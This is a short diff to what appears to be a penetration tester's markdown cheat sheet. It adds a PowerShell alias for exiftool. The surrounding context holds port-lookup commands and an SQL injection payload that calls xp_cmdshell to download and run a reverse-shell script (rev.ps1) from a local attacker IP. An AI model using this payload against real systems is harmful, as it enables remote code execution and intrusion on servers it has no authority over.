@@ -122,6 +122,12 @@ Get-Process -Id (Get-NetUDPEndpoint -LocalPort 8000).OwningProcess
 netstat -a -b
 ```
 
+Creating an alias with PowerShell.
+
+```bash
+Set-Alias -Name exiftool -Value "C:\Users\Administrator\Desktop\exiftool-12.92_64\exiftool-12.92_64\exiftool.exe"
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
